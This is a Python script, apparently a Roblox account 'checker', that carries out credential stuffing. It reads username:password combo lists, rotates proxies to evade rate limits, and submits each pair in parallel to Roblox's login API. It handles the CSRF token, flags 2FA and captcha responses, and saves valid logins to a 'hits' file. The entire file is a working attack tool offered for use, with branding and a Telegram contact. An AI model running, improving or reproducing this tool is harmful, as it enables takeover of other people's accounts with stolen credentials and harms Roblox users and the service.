import httpx
import time
import os
import sys
from colorama import Fore, Style, init as colorama_init

colorama_init(autoreset=True)

ASCII_ART = '''
██████╗  ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗      
██╔══██╗██╔═══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝      
██████╔╝██║   ██║██████╔╝██║     ██║   ██║ ╚███╔╝       
██╔══██╗██║   ██║██╔══██╗██║     ██║   ██║ ██╔██╗       
██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗      
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝      
 ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
'''
SUBTITLE = "   Made with ♥ By Yashvir Gaming | Telegram: https://t.me/therealyashvirgamingbot\n"

def print_art():
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.RED]
    lines = ASCII_ART.strip('\n').split('\n')
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        print(color + line.center(85))
    print(Fore.WHITE + SUBTITLE.center(85))
    print('-' * 85)

def dragdrop_input(msg):
    print(msg)
    s = input("  > ").strip('" ')
    while not s or not os.path.isfile(s):
        print(Fore.RED + "File not found. Drag & drop again:")
        s = input("  > ").strip('" ')
    return s

def parse_proxy(line):
    line = line.strip()
    if not line: return None
    if '@' in line:
        creds, address = line.split('@', 1)
        if ':' in creds and ':' in address:
            user, pwd = creds.split(':', 1)
            host, port = address.split(':', 1)
            return f"http://{user}:{pwd}@{host}:{port}"
    elif line.count(':') == 3:
        host, port, user, pwd = line.split(':', 3)
        return f"http://{user}:{pwd}@{host}:{port}"
    elif line.count(':') == 1:
        return f"http://{line}"
    return None

def load_proxies(fn):
    proxies = []
    if not fn: return []
    with open(fn, encoding="utf-8", errors="ignore") as f:
        for line in f:
            pr = parse_proxy(line)
            if pr: proxies.append(pr)
    return proxies

def load_combos(fn):
    combos = []
    with open(fn, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    combos.append(parts)
    return combos

def check_login(username, password, proxy=None):
    api_url = "https://auth.roblox.com/v2/login"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Roblox/WinInet",
        "Accept": "application/json",
        "X-CSRF-TOKEN": "fetch"
    }
    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }
    proxies = {"http://": proxy, "https://": proxy} if proxy else None
    try:
        with httpx.Client(timeout=20, proxies=proxies, follow_redirects=True) as client:
            r1 = client.post(api_url, headers=headers, json=payload)
            csrf_token = r1.headers.get("x-csrf-token")
            if not csrf_token:
                if r1.status_code == 403:
                    return "captcha"
                elif r1.status_code == 429:
                    return "rate_limit"
                return "error"
            headers["X-CSRF-TOKEN"] = csrf_token
            r2 = client.post(api_url, headers=headers, json=payload)
            if r2.status_code == 200:
                data = r2.json()
                if data.get("user") and data.get("twoStepVerificationData") is None:
                    return "success"
                if data.get("twoStepVerificationData"):
                    return "2fa"
                return "unknown"
            if r2.status_code == 401:
                return "bad_credentials"
            if r2.status_code == 403:
                return "captcha"
            if r2.status_code == 429:
                return "rate_limit"
            return f"error_{r2.status_code}"
    except Exception:
        return "network_error"

def main():
    print_art()
    combo_file = dragdrop_input(Fore.YELLOW + "Drag & drop your combo .txt file then press Enter:" + Style.RESET_ALL)
    proxy_file = input(Fore.YELLOW + "Drag & drop your proxy .txt file or press Enter for proxyless:\n  > " + Style.RESET_ALL).strip('" ')
    proxies = []
    if proxy_file:
        if os.path.isfile(proxy_file):
            proxies = load_proxies(proxy_file)
            print(Fore.GREEN + f"Loaded {len(proxies)} proxies")
        else:
            print(Fore.RED + "Proxy file not found. Running proxyless.")
    combos = load_combos(combo_file)
    print(Fore.GREEN + f"Loaded {len(combos)} combos")
    threads = input(Fore.YELLOW + "Threads (default 10, max 50): " + Style.RESET_ALL)
    try:
        threads = int(threads)
        if threads < 1 or threads > 50:
            threads = 10
    except:
        threads = 10

    from concurrent.futures import ThreadPoolExecutor
    from threading import Lock

    # --- MODIFICATION ICI : dossier spécifique pour les hits ---
    save_dir = r"C:\Users\Asus\Desktop\jeu"
    os.makedirs(save_dir, exist_ok=True)  # Crée le dossier s'il n'existe pas
    hit_file = os.path.join(save_dir, "hits.txt")
    # -------------------------------------------------------------

    lock = Lock()
    def worker(idx, username, password):
        proxy = proxies[idx % len(proxies)] if proxies else None
        print(Fore.CYAN + f"[CHECKING] {username}:{password}")
        result = check_login(username, password, proxy)
        if result == "success":
            print(Fore.GREEN + Style.BRIGHT + f"[HIT] {username}:{password}")
            with lock:
                with open(hit_file, "a", encoding="utf-8") as f:
                    f.write(f"{username}:{password}\n")
        elif result == "bad_credentials":
            print(Fore.RED + Style.BRIGHT + f"[FAIL] {username}:{password}")
        elif result == "2fa":
            print(Fore.YELLOW + f"[2FA] {username}:{password}")
        elif result == "captcha":
            print(Fore.MAGENTA + f"[CAPTCHA] {username}:{password}")
        elif result == "rate_limit":
            print(Fore.BLUE + f"[RATE LIMITED] {username}:{password}")
            time.sleep(5)
        else:
            print(Fore.WHITE + f"[ERROR] {username}:{password} - {result}")
        time.sleep(0.5)

    print(Fore.CYAN + "\n🚀 Starting verification process...\n")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for idx, (username, password) in enumerate(combos):
            executor.submit(worker, idx, username, password)
    print(Fore.MAGENTA + f"\nDone! Hits saved in {hit_file}\n" + Style.RESET_ALL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProcess interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\nCritical error: {str(e)}")
        sys.exit(1)
